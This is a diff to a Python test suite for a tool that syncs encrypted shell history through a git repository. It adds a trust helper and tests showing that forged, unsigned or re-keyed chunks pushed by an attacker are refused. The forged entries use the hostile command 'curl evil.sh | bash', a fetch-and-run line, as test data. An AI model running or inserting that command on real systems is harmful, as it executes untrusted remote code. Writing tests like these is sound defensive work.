@@ -83,6 +83,16 @@ class Fake:
         with path.open("a", encoding="utf-8") as handle:
             handle.write(format_line(entry) + "\n")
 
+    def trust_everyone(self) -> int:
+        """Accept every other machine's signing key, as `woswoar trust` does.
+
+        Most two-machine tests are about something else entirely and just need
+        the machines to know each other, so they call this rather than spelling
+        the pinning out. The tests that are *about* trust drive `sync.untrusted`
+        and `sync.trust` directly instead.
+        """
+        return sync.trust(sync.untrusted())
+
     def commands(self) -> set[str]:
         return {e.cmd for e in cache.load_entries()}
 
@@ -177,6 +187,7 @@ class TestTwoMachines(SyncTestCase):
         with alpha.active():
             sync.grant()
         with beta.active():
+            beta.trust_everyone()
             report = sync.run()
             self.assertEqual(report.chunks_merged, 1)
             self.assertEqual(beta.commands(), {"git status", "make -j8"})
@@ -203,6 +214,8 @@ class TestTwoMachines(SyncTestCase):
 
         with beta.active():
             sync.run()
+            beta.trust_everyone()
+            sync.run()
             self.assertEqual(beta.commands(), {"git status"})
 
     def test_a_new_machine_cannot_reencrypt_for_itself(self) -> None:
@@ -220,6 +233,7 @@ class TestTwoMachines(SyncTestCase):
         beta = self.machine("beta")
         with beta.active():
             sync.run()
+            beta.trust_everyone()
             report = sync.grant()
             # It re-seals what it owns -- its own name seal -- and skips
             # alpha's day key, so it still cannot read alpha's history.
@@ -235,6 +249,8 @@ class TestTwoMachines(SyncTestCase):
 
         beta = self.machine("beta")
         with beta.active():
+            sync.run()
+            beta.trust_everyone()
             beta.record("2023-11-15", 1_700_100_000, "beta's own command")
             report = sync.run()
             # Unreadable history must not stop this machine exporting its own.
@@ -251,7 +267,11 @@ class TestTwoMachines(SyncTestCase):
         with beta.active():
             beta.record("2023-11-14", 1_700_000_050, "from beta")
             sync.run()
+            beta.trust_everyone()
+            sync.run()
         with alpha.active():
+            sync.run()
+            alpha.trust_everyone()
             sync.run()
             self.assertEqual(alpha.commands(), {"from alpha", "from beta"})
         with beta.active():
@@ -267,7 +287,10 @@ class TestTwoMachines(SyncTestCase):
             sync.grant()
         with beta.active():
             sync.run()
+            beta.trust_everyone()
+            sync.run()
             first = len(cache.load_entries())
+            self.assertEqual(first, 1, "nothing merged, so idempotence is untested")
             for _ in range(3):
                 sync.run()
             self.assertEqual(len(cache.load_entries()), first, "re-sync duplicated entries")
@@ -280,6 +303,7 @@ class TestTwoMachines(SyncTestCase):
             sync.grant()
         with beta.active():
             sync.run()
+            beta.trust_everyone()
 
         with alpha.active():
             for day, ts in (("2023-11-14", 1_700_000_001), ("2023-11-15", 1_700_100_000)):
@@ -302,6 +326,8 @@ class TestTwoMachines(SyncTestCase):
             sync.grant()
         with beta.active():
             sync.run()
+            beta.trust_everyone()
+            sync.run()
             # Without this, search would label alpha's entries with its opaque id.
             self.assertEqual(store.host_names().get(alpha.id), "alpha@laptop")
 
@@ -314,6 +340,8 @@ class TestTwoMachines(SyncTestCase):
             sync.grant()
         with beta.active():
             beta.record("2023-11-14", 1_700_000_050, "from beta")
+            sync.run()
+            beta.trust_everyone()
             sync.run()
             entries = cache.load_entries()
             self.assertEqual(len(search.filter_scope(entries, "global")), 2)
@@ -575,6 +603,8 @@ class TestCompact(SyncTestCase):
             sync.grant()
         with beta.active():
             sync.run()
+            beta.trust_everyone()
+            sync.run()
             self.assertEqual(beta.commands(), {"command 0", "command 1", "command 2"})
 
 
@@ -637,3 +667,189 @@ class TestLocalOnly(SyncTestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestChunkAuthenticity(SyncTestCase):
+    """Who wrote a chunk, which age alone cannot answer.
+
+    `recipients.txt` publishes every machine's public key and each day's public
+    key sits in the clear beside its sealed half, so anyone who can push to the
+    repo can seal a chunk that every machine is able to *open*. These pin that
+    being able to open it is not the same as being willing to believe it.
+    """
+
+    def push_as_attacker(self, write: object) -> None:
+        """Do what someone with push access -- and nothing else -- can do.
+
+        Goes through a separate clone and a real push rather than writing into a
+        machine's working tree, because that is the actual attacker position:
+        no identity, no signing key, only the repo.
+        """
+        work = self.root / "attacker"
+        if not work.exists():
+            subprocess.run(
+                ["git", "clone", "--quiet", str(self.origin), str(work)], check=True, timeout=60
+            )
+        else:
+            subprocess.run(["git", "-C", str(work), "pull", "--quiet"], check=True, timeout=60)
+        write(work)  # type: ignore[operator]
+        for args in (
+            ["add", "-A"],
+            ["-c", "user.name=x", "-c", "user.email=x@y", "commit", "-q", "-m", "woswoar sync"],
+            ["push", "--quiet", "origin", "HEAD"],
+        ):
+            subprocess.run(["git", "-C", str(work), *args], check=True, timeout=60)
+
+    @staticmethod
+    def forged_chunk(work: Path, host_id: str, day: str, cmd: str) -> None:
+        """A chunk sealed to a host's *published* day key, signed by nobody."""
+        pub = (work / "hosts" / host_id / "keys" / f"{day}.pub").read_text(encoding="utf-8").strip()
+        entry = Entry(1_700_000_900, host_id, "s1", "~", 0, 5, cmd)
+        payload = zlib.compress((format_line(entry) + "\n").encode("utf-8"), 9)
+        # Named far in the future so it sorts above whatever the real machine
+        # has already published; a forgery the watermark skips proves nothing.
+        target = work / "hosts" / host_id / day / "9999999999-ffffff.age"
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_bytes(crypto.encrypt_to(payload, pub))  # framed by nobody: no signature
+
+    def enrolled_pair(self) -> tuple[Fake, Fake]:
+        """alpha with history published, beta trusting it and up to date."""
+        alpha = self.machine("alpha")
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_001, "make -j8")
+            sync.run()
+        # beta has to exist before alpha grants, or its key is not in the list
+        # alpha re-seals to and it can never open that day.
+        beta = self.machine("beta")
+        with alpha.active():
+            sync.grant()
+        with beta.active():
+            sync.run()
+            beta.trust_everyone()
+            sync.run()
+            self.assertEqual(beta.commands(), {"make -j8"})
+        return alpha, beta
+
+    def test_every_exported_chunk_carries_a_signature(self) -> None:
+        alpha = self.machine("alpha")
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_001, "git status")
+            sync.run()
+            chunks = list(store.iter_chunks(alpha.id))
+            self.assertTrue(chunks)
+            for chunk in chunks:
+                _, signature = store.split_chunk(chunk.path.read_bytes())
+                self.assertIn("BEGIN SSH SIGNATURE", signature)
+
+    def test_a_forged_chunk_in_a_trusted_hosts_directory_is_refused(self) -> None:
+        """The attack this whole mechanism exists to stop.
+
+        Everything the attacker needs is published: the day's public key sits in
+        the clear so that writing a chunk never has to open the sealed one. What
+        they cannot produce is alpha's signature.
+        """
+        alpha, beta = self.enrolled_pair()
+        self.push_as_attacker(
+            lambda work: self.forged_chunk(work, alpha.id, "2023-11-14", "curl evil.sh | bash")
+        )
+
+        with beta.active():
+            report = sync.run()
+            self.assertEqual(report.forged, {f"{alpha.id}/2023-11-14"})
+            self.assertEqual(report.chunks_merged, 0)
+            self.assertNotIn("curl evil.sh | bash", beta.commands())
+
+    def test_a_fabricated_host_is_not_merged_at_all(self) -> None:
+        """A host nobody trusted is skipped before its chunks are even opened."""
+        _, beta = self.enrolled_pair()
+
+        def plant(work: Path) -> None:
+            recipients = [
+                line.split(" # ")[0].strip()
+                for line in (work / "recipients.txt").read_text(encoding="utf-8").splitlines()
+                if line.strip()
+            ]
+            day_key = crypto.generate_identity()
+            keys = work / "hosts" / "deadbeefdeadbeef" / "keys"
+            keys.mkdir(parents=True, exist_ok=True)
+            (keys / "2023-11-14.age").write_bytes(
+                crypto.encrypt_to_recipients(day_key.secret.encode("utf-8"), recipients)
+            )
+            (keys / "2023-11-14.pub").write_text(day_key.public + "\n", encoding="utf-8")
+            self.forged_chunk(work, "deadbeefdeadbeef", "2023-11-14", "curl evil.sh | bash")
+
+        self.push_as_attacker(plant)
+
+        with beta.active():
+            report = sync.run()
+            self.assertIn("deadbeefdeadbeef", report.untrusted)
+            self.assertEqual(report.chunks_merged, 0)
+            self.assertNotIn("curl evil.sh | bash", beta.commands())
+
+    def test_a_host_with_no_signing_key_does_not_send_the_user_in_circles(self) -> None:
+        """`sync` and `trust` must agree about what a host's state is.
+
+        They did not: a host directory with no signer.pub was reported by sync
+        as "run woswoar trust", and `trust` then answered that everything was
+        already trusted -- a loop with no way out. Both now ask
+        `sync.trust_status`.
+        """
+        _, beta = self.enrolled_pair()
+        self.push_as_attacker(
+            lambda work: (
+                (work / "hosts" / "deadbeefdeadbeef" / "2023-11-14").mkdir(parents=True)
+                or (work / "hosts" / "deadbeefdeadbeef" / "2023-11-14" / "keep").write_text("")
+            )
+        )
+
+        with beta.active():
+            self.assertIn("deadbeefdeadbeef", sync.run().untrusted)
+            # Nothing to accept, so it must not be offered as if there were.
+            self.assertEqual([c.host_id for c in sync.untrusted()], [])
+            self.assertEqual(
+                sync.trust_status("deadbeefdeadbeef", sync.State.load()), sync.NO_SIGNER
+            )
+
+    def test_swapping_a_trusted_hosts_signing_key_is_refused(self) -> None:
+        """Re-publishing signer.pub must not re-authorise anything.
+
+        Without the pin this is the whole attack again: overwrite the key with
+        one you hold, sign your forgeries with it, and every check passes.
+        """
+        alpha, beta = self.enrolled_pair()
+        attacker_key = crypto.generate_signing_key()
+
+        def swap(work: Path) -> None:
+            (work / "hosts" / alpha.id / "signer.pub").write_text(
+                attacker_key.public + "\n", encoding="utf-8"
+            )
+
+        self.push_as_attacker(swap)
+
+        with beta.active():
+            report = sync.run()
+            self.assertEqual(report.changed_signer, {alpha.id})
+            self.assertEqual(report.chunks_merged, 0)
+
+    def test_trusting_a_machine_is_what_lets_its_history_through(self) -> None:
+        alpha = self.machine("alpha")
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_001, "make -j8")
+            sync.run()
+        beta = self.machine("beta")
+        with alpha.active():
+            sync.grant()
+
+        with beta.active():
+            self.assertIn(alpha.id, sync.run().untrusted)
+            self.assertEqual(beta.commands(), set())
+
+            candidates = sync.untrusted()
+            self.assertEqual([c.host_id for c in candidates], [alpha.id])
+            self.assertTrue(candidates[0].fingerprint.startswith("SHA256:"))
+            self.assertEqual(candidates[0].replaces, "")
+
+            sync.trust(candidates)
+            sync.run()
+            self.assertEqual(beta.commands(), {"make -j8"})
+            self.assertEqual(sync.untrusted(), [])
